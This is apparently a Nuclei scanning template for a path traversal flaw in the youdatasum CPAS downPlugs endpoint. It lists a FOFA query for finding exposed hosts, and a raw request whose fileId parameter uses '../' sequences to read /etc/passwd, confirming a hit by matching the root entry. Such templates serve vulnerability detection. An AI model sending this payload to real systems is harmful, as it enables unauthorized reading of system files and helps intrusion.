id: youdatasum-CPAS-downPlugs-downloadfile
info:
  author: PokerSec
  metadata:
    fofasearch: body:"/cpasm4/views/cap/login"
  name: youdatasum-CPAS-downPlugs-downloadfile
  severity: high
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName=
    HTTP/1.1

    Host: {{Hostname}}'
